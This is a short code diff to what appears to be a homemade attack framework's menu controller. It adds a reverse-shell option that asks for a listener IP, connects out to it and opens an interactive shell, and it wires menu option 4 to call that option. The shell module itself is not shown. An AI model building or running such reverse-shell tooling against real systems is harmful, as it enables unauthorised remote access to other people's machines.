@@ -1,6 +1,6 @@
 import sys
 import os
-from modules import scanenv, localhostenv
+from modules import scanenv, localhostenv, reverse_shell
 from pyfiglet import Figlet
 
 def banner(titel):
@@ -83,8 +83,14 @@ class AttackController:
     def exploit_menu(self):
         pass
 
-    def post_exploit_menu(self):
-        pass
+    def reverseshell(self):
+        listener_ip_address = input("[*] IP OF LISTENING HOST: ")
+
+        rev = reverse_shell().ReverseShell()
+        target_connection = rev.connect(listener_ip_address)
+
+        rev.shell(target_connection)
+
 
     def categories(self):
 
@@ -109,7 +115,7 @@ class AttackController:
         if input_section == "3":
             pass
         if input_section == "4":
-            pass
+            AttackController().reverseshell()
 
 def main():
 
